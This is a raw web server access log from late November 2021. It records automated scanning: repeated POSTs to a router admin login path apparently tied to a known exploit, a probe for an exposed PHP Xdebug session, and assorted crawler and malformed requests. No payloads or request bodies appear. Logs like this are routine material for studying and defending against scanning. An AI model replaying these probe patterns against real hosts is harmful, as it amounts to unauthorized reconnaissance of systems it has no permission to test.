195.133.18.118 - - [28/Nov/2021:04:27:14 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [28/Nov/2021:04:34:54 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 943 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.133.18.118 - - [28/Nov/2021:04:35:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:35:46 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:04:36:46 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
218.248.240.131 - - [28/Nov/2021:04:36:46 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:04:42:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:42:23 +0000] "" 400 0 "-" "-"
218.248.240.131 - - [28/Nov/2021:04:45:08 +0000] "GET / HTTP/1.1" 200 41 "-" "-"
195.133.18.118 - - [28/Nov/2021:04:48:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:48:30 +0000] "" 400 0 "-" "-"
45.137.21.9 - - [28/Nov/2021:04:50:45 +0000] "GET /dispatch.asp HTTP/1.1" 404 134 "-" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2"
195.133.18.118 - - [28/Nov/2021:04:52:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:04:52:57 +0000] "" 400 0 "-" "-"
142.93.188.229 - - [28/Nov/2021:04:56:06 +0000] "GET / HTTP/1.0" 200 41 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
142.93.188.229 - - [28/Nov/2021:05:01:13 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:05:02:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:05:02:26 +0000] "" 400 0 "-" "-"
195.133.18.118 - - [28/Nov/2021:05:09:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://59.96.56.234:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.18.118 - - [28/Nov/2021:05:09:10 +0000] "" 400 0 "-" "-"
185.142.236.35 - - [28/Nov/2021:05:09:14 +0000] "GET / HTTP/1.1" 200 41 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.35 - - [28/Nov/2021:05:09:14 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "-"
185.142.236.35 - - [28/Nov/2021:05:09:15 +0000] "GET /sitemap.xml HTTP/1.1" 404 162 "-" "-"
185.142.236.35 - - [28/Nov/2021:05:09:16 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 162 "-" "-"
185.142.236.35 - - [28/Nov/2021:05:09:17 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
